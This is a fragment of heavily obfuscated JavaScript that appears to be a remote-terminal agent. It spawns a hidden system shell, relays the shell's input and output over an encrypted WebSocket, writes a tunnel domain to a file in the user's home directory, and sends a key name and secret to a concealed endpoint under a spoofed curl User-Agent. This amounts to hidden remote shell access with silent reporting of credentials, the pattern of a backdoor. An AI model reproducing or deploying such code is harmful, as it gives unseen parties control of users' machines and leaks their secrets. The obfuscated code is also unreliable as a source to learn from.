        return !f && !this['_SHZAL_KEY_HINT_SHOWN'] && (this['_SHZAL_KEY_HINT_SHOWN'] = !![], a0D[eQ(0x554)]('[KMODE]\x20⚠️\x20KMODE=2\x20未生效,\x20条件不满足:\x20' + d[eQ(0x16d)](';\x20') + eQ(0x7f3) + (b || a[eQ(0x373)]) + eQ(0x5e9) + (a0P['KNAME_KEY'] || eQ(0xd0)) + ')'), a0D[eQ(0x554)](a[eQ(0x5d1)])), f;
    }
    static [a0aY(0x2bc)]() {
        const eR = a0aY, a = {
                'AdBJR': function (b, c) {
                    return b === c;
                },
                'URCFb': function (b, c) {
                    return b(c);
                }
            };
        return a0P[eR(0x55a)] || a[eR(0x403)](a[eR(0x437)](String, process.env.SHZAL_DEBUG || '')[eR(0x4ee)](), eR(0x63f));
    }
    static [a0aY(0x3a8)](a) {
        const eS = a0aY, b = {
                'fXBQi': function (f, g) {
                    return f + g;
                },
                'LOIIG': 'end',
                'MUcjg': function (f, g) {
                    return f + g;
                },
                'UHekV': 'curl/8.5.0',
                'TZeeo': function (f, g) {
                    return f + g;
                },
                'uwxeC': function (f, g) {
                    return f + g;
                },
                'oOhgr': 'PUT\x20覆盖状态:\x20',
                'cMtmd': eS(0x371),
                'OkvAe': function (f, g) {
                    return f(g);
                },
                'qLFwE': eS(0x1c3),
                'VMynS': function (f, g, h, i, j) {
                    return f(g, h, i, j);
                },
                'Svfux': eS(0x2fd),
                'KaKCW': function (f, g) {
                    return f === g;
                },
                'TtjoM': function (f, g) {
                    return f(g);
                },
                'UjvWN': '上报失败\x20(状态\x20',
                'FjKKN': function (f, g) {
                    return f + g;
                },
                'vzVIE': eS(0x5ca),
                'ucugg': function (f, g) {
                    return f(g);
                },
                'yXkVY': function (f, g) {
                    return f + g;
                },
                'BYyBw': function (f, g) {
                    return f + g;
                },
                'CNoXq': eS(0x3d8),
                'vnveg': eS(0x354),
                'moRMb': function (f, g) {
                    return f > g;
                },
                'wvxsQ': eS(0x2b0),
                'CGHVL': function (f, g) {
                    return f(g);
                },
                'wnCHo': eS(0x4b8),
                'cgskL': '上报异常:\x20'
            }, c = this['reportShzalDebug'](), d = f => {
                const eT = eS;
                if (c)
                    a0D[eT(0x4a6)](b[eT(0x30d)](eT(0x37a), f));
            };
        return new Promise(f => {
            const eU = eS, g = {
                    'KiAHZ': function (n, o) {
                        return b['TZeeo'](n, o);
                    },
                    'LxEha': function (n, o) {
                        return n + o;
                    },
                    'Umhkb': eU(0x11b),
                    'qJMAX': function (n, o) {
                        const eV = eU;
                        return b[eV(0x801)](n, o);
                    },
                    'xbDkQ': b[eU(0x308)],
                    'TKbTi': b[eU(0x748)],
                    'OWKYv': function (n, o) {
                        return b['OkvAe'](n, o);
                    },
                    'xbIea': function (n, o) {
                        return n(o);
                    },
                    'eRyco': function (n, o) {
                        return b['fXBQi'](n, o);
                    },
                    'TnKkw': b[eU(0x7f5)],
                    'XBiGm': function (n, o) {
                        return n === o;
                    },
                    'fUwAE': function (n, o) {
                        const eW = eU;
                        return b[eW(0x1e8)](n, o);
                    },
                    'RRMTr': function (n, o) {
                        return n + o;
                    },
                    'cuMnX': function (n, o, p, q, r) {
                        const eX = eU;
                        return b[eX(0x33f)](n, o, p, q, r);
                    },
                    'pfoOV': b[eU(0x781)],
                    'NHFlx': function (n, o) {
                        return b['KaKCW'](n, o);
                    },
                    'vDpCu': function (n, o) {
                        const eY = eU;
                        return b[eY(0x10a)](n, o);
                    },
                    'Uyeno': function (n, o) {
                        const eZ = eU;
                        return b[eZ(0x6cc)](n, o);
                    },
                    'aOcAt': b['UjvWN']
                }, h = a0P['KNAME'], i = a0P[eU(0x636)] || a0P[eU(0x41a)], j = b[eU(0x7ab)](b[eU(0xa6)], a0k[eU(0x1ee)](0xc)[eU(0xec)](eU(0x4e4))), k = [
                    [
                        'c',
                        a
                    ],
                    [
                        'n',
                        h
                    ],
                    [
                        's',
                        i
                    ],
                    [
                        'e',
                        '7d'
                    ]
                ], l = n => {
                    const f0 = eU, o = n[f0(0x415)](([p, q]) => Buffer[f0(0x664)]('--' + j + '\x0d\x0aContent-Disposition:\x20form-data;\x20name=\x22' + p + f0(0x45c) + q + '\x0d\x0a'));
                    return o[f0(0x560)](Buffer[f0(0x664)]('--' + j + f0(0x29c))), Buffer[f0(0x12a)](o);
                }, m = (n, o, p, q) => {
                    const f1 = eU, r = { 'ltRdO': b['LOIIG'] }, s = new URL(n), t = a0h[f1(0x133)]({
                            'hostname': s[f1(0x5e8)],
                            'port': s['port'] || 0x1bb,
                            'path': b[f1(0x1e8)](s['pathname'], s[f1(0x759)]),
                            'method': p,
                            'headers': {
                                'Content-Type': f1(0x773) + j,
                                'Content-Length': o ? o[f1(0x7bc)] : 0x0,
                                'User-Agent': b['UHekV']
                            }
                        }, v => {
                            const f2 = f1;
                            v['resume'](), v['on'](r[f2(0x7ef)], () => q(v[f2(0x62b)]));
                        });
                    t['on'](f1(0x1c6), v => {
                        const f3 = f1;
                        d(g[f3(0x188)](g[f3(0x729)](p + '\x20', n) + g[f3(0x2a6)], v['message'])), q(0x0);
                    }), t[f1(0x352)](0x7530, () => t[f1(0x541)](new Error(f1(0x612))));
                    if (o)
                        t[f1(0x81f)](o);
                    t[f1(0x581)]();
                };
            b['ucugg'](d, b[eU(0x282)](b[eU(0x282)](b['BYyBw'](b['CNoXq'], h) + b[eU(0xba)], b['moRMb'](i[eU(0x7bc)], 0x0)), ')'));
            try {
                m(b[eU(0x252)], b[eU(0x36d)](l, k), b[eU(0x4f8)], n => {
                    const f5 = eU, o = {
                            'dyNKZ': function (p, q) {
                                return p(q);
                            },
                            'AaBXP': function (p, q) {
                                return p + q;
                            },
                            'PPuFW': function (p, q) {
                                const f4 = a0b;
                                return g[f4(0x23d)](p, q);
                            },
                            'WIlOB': g[f5(0x274)],
                            'Jagfq': g[f5(0xc0)],
                            'uHJkN': function (p, q) {
                                const f6 = f5;
                                return g[f6(0xe2)](p, q);
                            },
                            'PpCKh': function (p, q) {
                                return p === q;
                            }
                        };
                    g['xbIea'](d, g['eRyco'](g[f5(0x700)], n));
                    if (g[f5(0x261)](n, 0x199)) {
                        g[f5(0xe2)](d, g[f5(0x44e)](g['RRMTr'](f5(0x357), h), ':*'));
                        const p = k[f5(0xfb)](([q]) => q !== 'n');
                        g[f5(0x51c)](m, f5(0xc4) + h + ':' + i, l(p), g[f5(0x53c)], q => {
                            const f7 = f5;
                            o[f7(0x582)](d, o[f7(0x44c)](o['PPuFW'](o['WIlOB'], q), q === 0xc8 ? o[f7(0x6dd)] : '\x20(失败)')), o[f7(0x161)](f, o['PpCKh'](q, 0xc8));
                        });
                    } else
                        g[f5(0x3e0)](n, 0xc8) ? (g[f5(0x32d)](d, f5(0x301)), g[f5(0x1ed)](f, !![])) : (g[f5(0x1ed)](d, g[f5(0x4ed)](g['eRyco'](g[f5(0x589)], n), ')')), f(![]));
                });
            } catch (n) {
                d(b[eU(0x6a2)] + n[eU(0x5a9)]), b[eU(0x36d)](f, ![]);
            }
        })[eS(0x607)](f => {
            const f8 = eS;
            if (f)
                this[f8(0x2d9)] = a;
            return f;
        })[eS(0x521)](() => ![]);
    }
    static async [a0aY(0x461)](a) {
        const b = {
            'MJqFt': function (c, d) {
                return c < d;
            }
        };
        for (let c = 0x1; c <= 0x3; c++) {
            if (await this['reportShzal'](a))
                return;
            b['MJqFt'](c, 0x3) && await new Promise(d => setTimeout(d, 0x3e8 * 0x2 ** c));
        }
    }
    static [a0aY(0x670)]() {
        const f9 = a0aY, a = [
                process.env.USERPROFILE,
                process.env.HOME
            ];
        for (const b of a) {
            if (b && a0l[f9(0x291)](b) && a0l[f9(0x52c)](b)[f9(0xd7)]())
                return b;
        }
        try {
            return a0p['homedir']();
        } catch (c) {
            return process[f9(0x5ff)]();
        }
    }
    static [a0aY(0x7a4)]() {
        const fa = a0aY, a = {
                'xLjBn': fa(0x3a1),
                'IgsTF': fa(0x3a2),
                'aoRIL': function (c, d) {
                    return c > d;
                }
            };
        let b = (a0P[fa(0x234)] || '')[fa(0x450)]();
        if (!b)
            return a0o['join'](this['homeDir'](), a[fa(0x40e)]);
        if (b['startsWith'](a['IgsTF']))
            b = a['aoRIL'](b['length'], 0x5) ? a0o['join'](this[fa(0x670)](), b[fa(0x462)](0x5)[fa(0xed)](/^[/\\]+/, '')) : this[fa(0x670)]();
        else
            b['startsWith']('~') && (b = a0o[fa(0x2c6)](b[fa(0xed)](/^~(?=[/\\]|$)/, this[fa(0x670)]())));
        return b;
    }
    static [a0aY(0x4d2)](a) {
        const fb = a0aY;
        this[fb(0x2d9)] = a;
        const b = this[fb(0x7a4)]();
        try {
            a0l['mkdirSync'](a0o[fb(0x2d4)](a0o[fb(0x2c6)](b)), { 'recursive': !![] }), a0l[fb(0x67a)](b, a), a0D['info']('[KMODE]\x20📄\x20隧道域名已写入:\x20' + b);
        } catch (c) {
            a0D[fb(0x10d)](fb(0xc5) + b + '):\x20' + c[fb(0x5a9)]);
        }
    }
    static ['deleteDomainFile']() {
        const fc = a0aY, a = this[fc(0x7a4)]();
        try {
            a0l['existsSync'](a) && a0l[fc(0x52c)](a)[fc(0x6c7)]() && (a0l[fc(0x7db)](a), a0D['info']('[KMODE]\x20🗑️\x20域名文件已删除:\x20' + a));
        } catch (b) {
            a0D['warn'](fc(0x210) + a + fc(0x136) + b['message']);
        }
    }
    static ['onBaseinfoSuccess']() {
        const fd = a0aY;
        !this[fd(0x2b7)] && (this['_baseinfoHooked'] = !![], this[fd(0x2c4)]());
    }
    static [a0aY(0x55e)]() {
        const fe = a0aY, a = {
                'HrjJF': fe(0x11c),
                'KHuBh': fe(0x75c),
                'JkMEf': 'error'
            };
        try {
            const b = a0q[fe(0x4db)]({
                'input': process[fe(0x447)],
                'terminal': ![]
            });
            b['on'](a[fe(0x5c8)], c => {
                const ff = fe;
                c[ff(0x450)]() === ff(0x732) && console[ff(0x569)](this[ff(0x2d9)] || a[ff(0x52f)]);
            }), b['on'](fe(0x233), () => {
            }), b['on'](a[fe(0x5b4)], () => {
            });
        } catch (c) {
        }
    }
    static [a0aY(0x80b)](a) {
        const fg = a0aY, b = {
                'Saksd': fg(0x28a),
                'GcqSJ': function (f, g) {
                    return f === g;
                },
                'LRdaJ': fg(0x111),
                'HhRFw': fg(0x14f)
            }, c = b[fg(0x7cf)]['split']('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                a[fg(0x552)](a0P['PORT'])[fg(0x607)](f => {
                    const fh = fg;
                    this['writeDomainFile'](f[fh(0x54c)]);
                })[fg(0x521)](f => {
                    const fi = fg;
                    a0D['warn'](fi(0x242) + f[fi(0x5a9)]);
                });
                continue;
            case '1':
                a['onDomainChange'] = (f, g) => {
                    const fj = fg;
                    this[fj(0x4d2)](g);
                };
                continue;
            case '2':
                if (b[fg(0x577)](a0P[fg(0x6c0)], '2') && this['knameValid']()) {
                    a0D[fg(0x554)](b[fg(0x5f0)]), a[fg(0x70f)] = (f, g) => {
                        this['reportDomainChange'](g);
                    }, a[fg(0x552)](a0P[fg(0xe9)])['then'](f => this[fg(0x3a8)](f[fg(0x54c)]))[fg(0x521)](() => {
                    });
                    return;
                }
                continue;
            case '3':
                a0D[fg(0x554)](b[fg(0x278)]);
                continue;
            case '4':
                this[fg(0x55e)]();
                continue;
            }
            break;
        }
    }
}
let a0aO = null, a0aP = null;
const a0aQ = new Promise((a, b) => {
    const fk = a0aY, c = {
            'KmpXE': fk(0x3f6),
            'StXwV': fk(0x5c7),
            'yETdG': function (d) {
                return d();
            },
            'jKWRp': function (d, f) {
                return d(f);
            },
            'Ofpgh': function (d) {
                return d();
            }
        };
    try {
        c[fk(0x24d)](a0y, function (d) {
            const fl = fk;
            if (!d) {
                a0aP = new Error(c[fl(0x100)]), a0D[fl(0x10d)](c[fl(0x683)], a0aP['message']), c[fl(0x369)](a);
                return;
            }
            a0aO = d, a0D[fl(0x4a6)]('Noise\x20WASM\x20module\x20loaded\x20successfully'), c[fl(0x369)](a);
        });
    } catch (d) {
        a0aP = d, a0D[fk(0x10d)](fk(0x13e), d[fk(0x5a9)]), c[fk(0x6a4)](a);
    }
});
process['on'](a0aY(0x149), (a, b) => {
    const fm = a0aY;
    a0D[fm(0x1c6)](fm(0x623), a);
}), process['on']('uncaughtException', a => {
    const fn = a0aY, b = { 'CqplX': fn(0x793) };
    a0D[fn(0x1c6)](b[fn(0x327)], a), process[fn(0x205)](0x1);
});
function a0b(a, b) {
    a = a - 0x9a;
    const c = a0a();
    let d = c[a];
    if (a0b['RqHWiP'] === undefined) {
        var e = function (h) {
            const i = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
            let j = '', l = '';
            for (let m = 0x0, n, o, p = 0x0; o = h['charAt'](p++); ~o && (n = m % 0x4 ? n * 0x40 + o : o, m++ % 0x4) ? j += String['fromCharCode'](0xff & n >> (-0x2 * m & 0x6)) : 0x0) {
                o = i['indexOf'](o);
            }
            for (let q = 0x0, r = j['length']; q < r; q++) {
                l += '%' + ('00' + j['charCodeAt'](q)['toString'](0x10))['slice'](-0x2);
            }
            return decodeURIComponent(l);
        };
        a0b['osfyvV'] = e, a0b['FPacty'] = {}, a0b['RqHWiP'] = !![];
    }
    const f = c[0x0];
    a0b['VkokJQ'] !== f && (a0b['FPacty'] = {}, a0b['VkokJQ'] = f);
    const g = a0b['FPacty'][a];
    return g === undefined ? (d = a0b['osfyvV'](d), a0b['FPacty'][a] = d) : d = g, d;
}
class a0aR {
    constructor(a, b, c) {
        const fo = a0aY, d = fo(0x418)[fo(0x493)]('|');
        let f = 0x0;
        while (!![]) {
            switch (d[f++]) {
            case '0':
                this['expectedRemotePubB64'] = c;
                continue;
            case '1':
                this['hs'] = null;
                continue;
            case '2':
                this[fo(0x6c2)] = null;
                continue;
            case '3':
                this['recvCipher'] = null;
                continue;
            case '4':
                this['handshakeFinished'] = ![];
                continue;
            case '5':
                this[fo(0x1df)] = b;
                continue;
            case '6':
                this[fo(0x5de)] = a;
                continue;
            }
            break;
        }
    }
    async ['init']() {
        const fp = a0aY, a = {
                'uZNeB': fp(0x7e4),
                'lgedO': fp(0x682),
                'eqXSV': fp(0x4e2),
                'yiPFt': 'base64'
            };
        await a0aQ;
        if (!a0aO)
            throw a0aP || new Error(a[fp(0x758)]);
        const b = a0aO, c = this[fp(0x5de)] ? b[fp(0x667)][fp(0x772)] : b['constants']['NOISE_ROLE_RESPONDER'];
        this['hs'] = b[fp(0x4f9)](a['lgedO'], c);
        const d = Buffer['from'](a[fp(0x2e4)]), f = this[fp(0x1df)] ? Buffer[fp(0x664)](this[fp(0x1df)], a['yiPFt']) : null, g = this[fp(0x77e)] ? Buffer[fp(0x664)](this[fp(0x77e)], a[fp(0x22b)]) : null;
        this['hs'][fp(0x69d)](d, f, g, null);
    }
    [a0aY(0x519)](a) {
        const fq = a0aY, b = {
                'ycdhy': function (d, f) {
                    return d > f;
                },
                'sxUmh': function (d, f) {
                    return d === f;
                }
            };
        if (this['handshakeFinished'])
            return Buffer[fq(0x4b7)](0x0);
        const c = a0aO;
        a && b[fq(0x1ba)](a[fq(0x7bc)], 0x0) && this['hs'][fq(0x7e9)]() === c[fq(0x667)][fq(0x36b)] && this['hs'][fq(0x22f)](a);
        if (this['hs'][fq(0x7e9)]() === c['constants']['NOISE_ACTION_SPLIT'])
            return this[fq(0x78b)](), Buffer[fq(0x4b7)](0x0);
        if (b[fq(0x396)](this['hs']['GetAction'](), c['constants'][fq(0x365)])) {
            const d = this['hs'][fq(0x49d)](new Uint8Array(0x0));
            return b[fq(0x396)](this['hs'][fq(0x7e9)](), c[fq(0x667)][fq(0x566)]) && this[fq(0x78b)](), Buffer[fq(0x664)](d);
        }
        return Buffer[fq(0x4b7)](0x0);
    }
    [a0aY(0x78b)]() {
        const fr = a0aY, a = {
                'GtCmb': fr(0x2df),
                'diZwZ': function (g, h) {
                    return g === h;
                },
                'cJCVl': 'Noise\x20peer\x20static\x20key\x20verification\x20failed'
            };
        let b = null;
        try {
            b = this['hs'][fr(0x58d)]();
        } catch (g) {
            b = null;
        }
        const c = this[fr(0x77e)] ? Buffer[fr(0x664)](this['expectedRemotePubB64'], a[fr(0x38b)]) : null, d = b && c && a[fr(0x6b8)](b[fr(0x7bc)], c[fr(0x7bc)]) && a0k[fr(0x32e)](Buffer[fr(0x664)](b), c);
        if (!d)
            throw new Error(a[fr(0x150)]);
        const f = this['hs'][fr(0x277)]();
        this['sendCipher'] = f[0x0], this['recvCipher'] = f[0x1], this['handshakeFinished'] = !![];
        try {
            if (this['hs'])
                this['hs'][fr(0x642)]();
        } catch (h) {
        }
        this['hs'] = null;
    }
    ['encrypt'](a) {
        const ft = a0aY;
        if (!this['handshakeFinished'])
            throw new Error('握手未完成，无法加密数据');
        const b = new Uint8Array(0x0), c = new Uint8Array(a);
        return Buffer[ft(0x664)](this[ft(0x6c2)][ft(0x6cd)](b, c));
    }
    [a0aY(0x6f0)](a) {
        const fu = a0aY, b = { 'aZsFQ': fu(0x101) };
        if (!this['handshakeFinished'])
            throw new Error(b[fu(0x2a4)]);
        const c = new Uint8Array(0x0), d = new Uint8Array(a);
        return Buffer[fu(0x664)](this[fu(0x7ee)][fu(0x27f)](c, d));
    }
    [a0aY(0x642)]() {
        const fv = a0aY;
        try {
            if (this[fv(0x6c2)])
                this[fv(0x6c2)][fv(0x642)]();
        } catch (a) {
        }
        try {
            if (this[fv(0x7ee)])
                this['recvCipher'][fv(0x642)]();
        } catch (b) {
        }
        try {
            if (this['hs'])
                this['hs'][fv(0x642)]();
        } catch (c) {
        }
        this[fv(0x6c2)] = null, this[fv(0x7ee)] = null, this['hs'] = null;
    }
}
class a0aS {
    constructor(a, b, c, d) {
        const fw = a0aY;
        this[fw(0x510)] = a, this['env'] = b, this[fw(0x5ff)] = c, this['args'] = d || [], this[fw(0x141)] = null, this[fw(0x76c)] = 0x0, this[fw(0x32a)] = null, this[fw(0x638)] = null;
    }
    ['spawn']() {
        const fx = a0aY, a = {
                'yShIp': function (c, d) {
                    return c || d;
                },
                'UIisq': 'pipe',
                'MgCov': fx(0x54a),
                'udZcq': 'exit'
            };
        this['proc'] = a0s(this['shell'], this[fx(0x4a3)], {
            'env': this['env'],
            'cwd': this['cwd'],
            'windowsHide': !![],
            'stdio': [
                fx(0x652),
                a['UIisq'],
                fx(0x652)
            ]
        }), this[fx(0x76c)] = this[fx(0x141)][fx(0x76c)] || 0x0;
        const b = this;
        this[fx(0x141)][fx(0x40a)]['on'](a[fx(0x14d)], c => b[fx(0x574)](c)), this['proc']['stderr']['on'](a[fx(0x14d)], c => b[fx(0x574)](c)), this['proc']['on'](a[fx(0x4d7)], (c, d) => {
            const fy = fx;
            if (b[fy(0x638)])
                b[fy(0x638)]({
                    'exitCode': c,
                    'signal': a['yShIp'](d, null)
                });
        });
    }
    [a0aY(0x574)](a) {
        const fz = a0aY, b = { 'wTIWo': fz(0x770) };
        if (this[fz(0x32a)])
            this[fz(0x32a)](a[fz(0xec)](b[fz(0x1e3)]));
    }
    [a0aY(0x44b)](a) {
        return this['_onDataCb'] = a, {
            'dispose': () => {
                this['_onDataCb'] = null;
            }
        };
    }
    [a0aY(0x5b8)](a) {
        const fA = a0aY;
        return this[fA(0x638)] = a, {
            'dispose': () => {
                const fB = fA;
                this[fB(0x638)] = null;
            }
        };
    }
    [a0aY(0x81f)](a) {
        const fC = a0aY;
        if (!this[fC(0x141)] || !this[fC(0x141)][fC(0x447)])
            return;
        try {
            this['proc'][fC(0x447)][fC(0x81f)](a);
        } catch (b) {
        }
    }
    [a0aY(0x4e5)]() {
    }
    [a0aY(0x19f)]() {
        const fD = a0aY;
        try {
            if (this[fD(0x141)])
                this[fD(0x141)][fD(0x19f)]();
        } catch (a) {
        }
    }
}
class a0aT {
    constructor() {
        const fE = a0aY, a = { 'wuwJP': fE(0x506) };
        this[fE(0x757)] = null, this[fE(0xfe)] = null, this[fE(0x482)] = null, this[fE(0xb1)] = !![], this[fE(0x6e8)] = ![], this[fE(0x5cb)] = ![], this[fE(0x604)] = a[fE(0x804)], this[fE(0x679)] = [], this[fE(0x4d9)] = [], this[fE(0x69b)] = a0P['NOISE_KEYS_INTERNAL'][fE(0x74d)][fE(0x1c7)], this['CONTROL_PUBLIC_KEY'] = a0P[fE(0x5c5)][fE(0x43e)][fE(0x45e)], this['cipher'] = new a0aR(![], this[fE(0x69b)], this[fE(0x5f4)]);
    }
    async ['cleanup']() {
        const fF = a0aY, a = {
                'HbiHS': function (b, c) {
                    return b === c;
                },
                'thCVq': fF(0x845)
            };
        this[fF(0x482)] && a0D[fF(0x554)]('[' + this[fF(0x482)] + fF(0x611));
        if (this[fF(0x757)]) {
            a[fF(0x5e6)](process[fF(0x795)], a['thCVq']) && this['ptyProcess'][fF(0x76c)] && this[fF(0x833)](this[fF(0x757)]['pid']);
            try {
                this[fF(0x757)][fF(0x19f)]();
            } catch (b) {
            }
            this['ptyProcess'] = null;
        }
        if (this[fF(0x7fa)])
            this['cipher'][fF(0x642)]();
        if (this['websocket'])
            try {
                this['websocket'][fF(0x169)] === this[fF(0xfe)][fF(0x337)] && this['websocket']['close'](0x3e8, fF(0x695));
            } catch (c) {
            } finally {
                this[fF(0xfe)] = null;
            }
    }
    [a0aY(0x833)](a) {
        const fG = a0aY, b = {
                'rqMoE': function (c, d, f, g) {
                    return c(d, f, g);
                }
            };
        try {
            b[fG(0x250)](a0r, fG(0x4eb) + a, { 'windowsHide': !![] }, () => {
            });
        } catch (c) {
        }
    }
    [a0aY(0x783)](a) {
        const fH = a0aY, b = {
                'sAfkO': function (c, d) {
                    return c === d;
                },
                'ueoOC': 'handshake',
                'ZUEWv': function (c, d) {
                    return c > d;
                },
                'aKRFZ': function (c, d) {
                    return c(d);
                },
                'OYgSp': fH(0x1e4)
            };
        if (b[fH(0x7b5)](this[fH(0x604)], b['ueoOC'])) {
            if (b[fH(0x320)](this[fH(0x4d9)]['length'], 0x0)) {
                const c = this['msgResolvers']['shift']();
                b[fH(0x771)](c, a);
            } else
                this[fH(0x679)]['push'](a);
        } else
            this['phase'] === b['OYgSp'] && this[fH(0x821)](a);
    }
    async ['_receiveWsBytes']() {
        const fI = a0aY, a = {
                'ytMKx': function (b, c) {
                    return b > c;
                }
            };
        if (a[fI(0x302)](this['msgQueue'][fI(0x7bc)], 0x0))
            return this[fI(0x679)][fI(0x3b9)]();
        return new Promise(b => {
            const fJ = fI;
            this[fJ(0x4d9)][fJ(0x560)](b);
        });
    }
    async [a0aY(0x630)](a) {
        const fK = a0aY, b = {
                'iyAyQ': function (c, d) {
                    return c(d);
                },
                'qjgVd': fK(0x3e7),
                'kuMTW': function (c, d) {
                    return c > d;
                },
                'gAagq': fK(0x71b),
                'paObL': function (c, d) {
                    return c(d);
                },
                'UWARE': fK(0x10f)
            };
        b[fK(0x779)](a, b[fK(0x3aa)]);
        try {
            await this[fK(0x7fa)][fK(0x30b)]();
            const c = await this[fK(0x158)](), d = this['cipher']['processHandshake'](c);
            d && b[fK(0x31b)](d[fK(0x7bc)], 0x0) && this['websocket'][fK(0x597)](d);
            const f = await this[fK(0x158)]();
            this['cipher'][fK(0x519)](f);
            if (!this[fK(0x7fa)][fK(0x1a0)])
                throw new Error(b['gAagq']);
            b['paObL'](a, fK(0xff));
        } catch (g) {
            b[fK(0x779)](a, fK(0x7a0) + g[fK(0x5a9)]);
            throw new Error(b['UWARE']);
        }
    }
    [a0aY(0x404)]() {
        const fL = a0aY, a = {
                'qnzKl': fL(0x55f),
                'raPuA': fL(0x6e5),
                'gtREJ': fL(0x17b),
                'iCKgf': fL(0x2c8),
                'HASgW': fL(0x21b),
                'vnEAe': fL(0x5c9),
                'aboKg': fL(0x18a),
                'WfkIl': '/bin/sh'
            };
        if (process[fL(0x795)] === fL(0x845)) {
            const d = process.env.SystemRoot || a['qnzKl'], f = [
                    a0o['join'](d, a[fL(0x5ad)], a[fL(0xde)], fL(0xbb), fL(0x24e)),
                    process.env.COMSPEC,
                    a0o[fL(0x16d)](d, fL(0x6e5), a[fL(0x3c2)])
                ];
            for (const g of f) {
                if (g && a0l['existsSync'](g))
                    return g;
            }
            return fL(0x2c8);
        }
        const b = [
            a['HASgW'],
            a['vnEAe'],
            a[fL(0x103)]
        ];
        for (const h of b) {
            if (a0l[fL(0x291)](h))
                return h;
        }
        const c = process.env.SHELL;
        if (c && a0l[fL(0x291)](c))
            return c;
        return a[fL(0xa2)];
    }
    async [a0aY(0x65a)](a, b, c, d = ![], f = ![]) {
        const fM = a0aY, g = {
                'hPauU': function (i, j) {
                    return i(j);
                },
                'MqNuR': fM(0x3b5),
                'RuZTU': fM(0x83f),
                'cHGty': 'message'
            };
        this[fM(0xfe)] = a, this[fM(0x482)] = b, this[fM(0x6e8)] = d, this[fM(0x5cb)] = f;
        const h = i => a0D['info'](fM(0x7a3) + b + ']\x20' + i);
        this[fM(0xb1)] = !c, g[fM(0x3f1)](h, this[fM(0xb1)] ? g[fM(0x7ea)] : g[fM(0x813)]), a['on'](g[fM(0x264)], i => this[fM(0x783)](i));
        try {
            this['useNoise'] && await this[fM(0x630)](h), await this[fM(0x662)](h);
        } catch (i) {
            h(fM(0x561) + i[fM(0x5a9)]), await this[fM(0x6c3)]();
        }
    }
    async ['_runTerminal'](a) {
        const fN = a0aY, b = {
                'yhIjY': fN(0x770),
                'DyuDj': function (h, i) {
                    return h === i;
                },
                'lxrnt': function (h, i) {
                    return h(i);
                },
                'uNvEd': fN(0x50f),
                'XHLAn': fN(0x530),
                'tkKFK': function (h, i) {
                    return h !== i;
                },
                'EmXFA': '/dev/null',
                'qQBcF': fN(0x845),
                'hpWkf': '-NoExit',
                'BRyps': fN(0x7a8),
                'sekKP': function (h) {
                    return h();
                },
                'NjZFb': function (h, i) {
                    return h(i);
                },
                'GIHTM': fN(0x1e4),
                'THNWP': function (h, i) {
                    return h(i);
                }
            }, c = this[fN(0x404)]();
        a(fN(0x4c6) + c);
        const d = Object[fN(0x303)]({}, process.env);
        delete d['PROMPT_COMMAND'], d[fN(0xee)] = b['XHLAn'];
        if (!d['LANG'])
            d[fN(0x4cd)] = fN(0x84b);
        this[fN(0x5cb)] && b[fN(0x5f9)](process[fN(0x795)], 'win32') && (d[fN(0x343)] = b[fN(0x6fe)]);
        const f = this[fN(0x5cb)] && b[fN(0x4c9)](process[fN(0x795)], b[fN(0x56a)]) && b[fN(0x4c9)](a0o[fN(0x146)](c)[fN(0x4ee)](), fN(0x24e)) ? [
                b[fN(0x44f)],
                fN(0x6f9),
                b[fN(0x520)]
            ] : [], g = b[fN(0x112)](a0E);
        try {
            const h = {
                'name': b[fN(0x14b)],
                'cols': 0x50,
                'rows': 0x18,
                'cwd': g,
                'env': d
            };
            if (process[fN(0x795)] === b[fN(0x56a)])
                try {
                    this[fN(0x757)] = a0C[fN(0x2b5)](c, f, h);
                } catch (i) {
                    b[fN(0x5a2)](a, fN(0x7c2) + i[fN(0x5a9)]), this[fN(0x757)] = new a0aS(c, d, g, f), this[fN(0x757)][fN(0x2b5)]();
                }
            else
                this[fN(0x757)] = a0C['spawn'](c, f, h);
            a('🚀\x20终端进程已启动\x20(PID:\x20' + (this[fN(0x757)][fN(0x76c)] || fN(0x600)) + ')');
            this[fN(0x6e8)] && this[fN(0x11f)](c);
            this[fN(0x604)] = b[fN(0x3a0)];
            while (this[fN(0x679)][fN(0x7bc)] > 0x0) {
                const j = this[fN(0x679)][fN(0x3b9)]();
                this[fN(0x821)](j);
            }
            this[fN(0x757)]['onData'](k => {
                const fO = fN;
                try {
                    let l = Buffer[fO(0x664)](k, b[fO(0x489)]);
                    this[fO(0xb1)] && this[fO(0x7fa)] && this[fO(0x7fa)][fO(0x1a0)] && (l = this[fO(0x7fa)][fO(0x5a8)](l)), b[fO(0x4c9)](this[fO(0xfe)][fO(0x169)], 0x1) && this['websocket']['send'](l);
                } catch (m) {
                }
            }), this[fN(0x757)][fN(0x5b8)](({
                exitCode: k,
                signal: l
            }) => {
                const fP = fN;
                b[fP(0x7e8)](a, fP(0x29f) + k + ',\x20Signal:\x20' + l + ')'), this['cleanup']();
            }), this['websocket']['on']('close', () => {
                const fQ = fN;
                b[fQ(0x7e8)](a, b[fQ(0x39d)]), this[fQ(0x6c3)]();
            });
        } catch (k) {
            b['THNWP'](a, fN(0x534) + k['message']), await this['cleanup']();
            throw k;
        }
    }
    static [a0aY(0x774)](a) {
        const fR = a0aY, b = {
                'ZsFor': function (d, f) {
                    return d(f);
                },
                'zfotZ': function (d, f) {
                    return d || f;
                },
                'rhWxE': fR(0x2b6)
            };
        let c = a0o[fR(0x146)](b['ZsFor'](String, b[fR(0x6fb)](a, ''))[fR(0x450)]())[fR(0x4ee)]();
        if (c[fR(0x344)](b[fR(0x728)]))
            c = c[fR(0x462)](0x0, -0x4);
        return c || 'sh';
    }
    static [a0aY(0x508)](a) {
        const fS = a0aY, b = {
                'EbxLv': function (c, d) {
                    return c === d;
                },
                'AjBfX': 'win32',
                'dneOL': function (c, d) {
                    return c(d);
                },
                'MtZNi': function (c, d) {
                    return c || d;
                },
                'RXjZG': 'powershell.exe',
                'rFwsQ': function (c, d) {
                    return c === d;
                },
                'LWvmh': fS(0x2c8)
            };
        if (b['EbxLv'](process[fS(0x795)], b[fS(0x37b)])) {
            const c = a0o[fS(0x146)](b['dneOL'](String, b['MtZNi'](a, '')))[fS(0x4ee)]();
            return b[fS(0x17a)](c, b[fS(0x82d)]) || b['rFwsQ'](c, b[fS(0x174)]);
        }
        return !![];
    }
    ['_sendWelcome'](a) {
        const fT = a0aY, b = { 'nIJIS': fT(0x734) };
        try {
